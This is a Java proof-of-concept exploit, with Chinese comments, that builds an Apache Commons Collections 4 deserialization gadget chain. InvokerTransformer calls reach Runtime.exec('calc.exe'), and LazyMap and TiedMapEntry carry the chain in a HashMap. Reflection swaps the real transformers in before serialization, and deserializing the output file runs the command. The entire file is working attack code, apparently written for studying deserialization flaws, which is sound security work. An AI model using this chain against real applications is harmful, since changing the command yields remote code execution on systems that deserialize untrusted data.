import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsK4 {

    public static void main(String[] args) throws Exception {

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] { "calc.exe" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 先使用fakeTransformer防止本地命令执行
        // decorate换成lazyMap
        Map lazyMap = LazyMap.lazyMap(new HashMap(), new ConstantTransformer(fakeTransformers));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
        HashMap hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"value");

        // 把if的key值去掉,进入if
        lazyMap.clear();

        // 使用反射替换transformerChain的transformers
        Class c = LazyMap.class;
        Field  factoryfield = c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        //在序列化的前⼀刻将其替换为真正的Transformers
        factoryfield.set(lazyMap,transformerChain);

        serialize(hashMap);
        unserialize();
    }

    public static void serialize (Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("k4.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static void unserialize () throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("k4.bin"));
        Object obj = inputStream.readObject();

    }
}
